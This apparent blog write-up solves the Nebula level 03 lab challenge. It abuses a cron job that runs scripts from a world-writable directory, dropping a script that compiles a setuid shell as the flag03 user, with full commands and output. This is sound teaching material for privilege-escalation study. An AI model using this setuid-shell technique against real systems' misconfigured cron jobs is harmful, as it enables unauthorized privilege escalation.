---
layout: post
title: "Scheduled job"
category: CTF, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 03](http://exploit-exercises.com/nebula/level03) Agenda**: "Check the home directory of flag03 and take note of the files there. There is a crontab that is called every couple of minutes."

<center>
	<img src="/images/2015-02-20-scheduled_job/957913ec0d93c51d2_303999e5.jpg">
</center>

<br />

The software utility [Cron](http://en.wikipedia.org/wiki/Cron) is a time-based job scheduler in Unix-like computer operating systems. People who set up and maintain software environments use cron to schedule jobs (commands or shell scripts) to run periodically at fixed times, dates, or intervals.

{% highlight sh linenos %}
level03@nebula:/home/flag03$ ls -la
total 6
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh

level03@nebula:/home/flag03$ cat ./writable.sh

#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
{% endhighlight %}

After a small overwiev, as we can see that cron launches "*writable.sh*", which in turn executes and cleans each script from "*writable.d*" directory. In last but not least order, it also notable the [ulimit](http://ss64.com/bash/ulimit.html) restriction (in our case, limit the usage of maximum amount of cpu time to 5 seconds).

The first way that comes to mind to solve it, based on writing the simplest shell:

{% highlight sh linenos %}
level03@nebula:/home/flag03$ mkdir /tmp/level03
level03@nebula:/home/flag03$ touch /tmp/level03/shell.c
level03@nebula:/home/flag03$ vi /tmp/level03/shell.c
{% endhighlight %}
{% highlight C linenos %}
int main(int argc, char **argv, char **envp)
{
  system("/bin/sh");
  return 0;
}
{% endhighlight %}
And after that, setup the task for cron scheduler.
{% highlight sh linenos %}
level03@nebula:/home/flag03$ cd writable.d/
level03@nebula:/home/flag03/writable.d$ cat > cmd.sh

gcc /tmp/level03/shell.c -o /home/flag03/shell;
chmod +s /home/flag03/shell;
{% endhighlight %}
At line 4, we use [gcc](http://en.wikipedia.org/wiki/GNU_Compiler_Collection) compiler to compile our source into [ELF](http://en.wikipedia.org/wiki/Executable_and_Linkable_Format). Ok, now let's pay a few minutes (more precisely - 3, in nebula-5) for cron to have the harvest time:

{% highlight sh linenos %}
level03@nebula:/home/flag03$ ls -la ./shell && file ./shell                     

-rwsrwsr-x 1 flag03 flag03 7161 2015-03-08 09:33 ./shell
./shell: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped

level03@nebula:/home/flag03$ ./shell
sh-4.2$ whoami
flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account
{% endhighlight %}

There's also exist the easier way:

{% highlight sh linenos %}
level03@nebula:/home/flag03/writable.d$ cat > enother.sh
getflag > /tmp/flag

level03@nebula:/home/flag03/writable.d$ cat /tmp/flag
You have successfully executed getflag on a target account
{% endhighlight %}

Don't forget to clean-up:

{% highlight sh linenos %}
level03@nebula:~$ rm -r /tmp/level03
level03@nebula:~$ rm /tmp/flag
{% endhighlight %}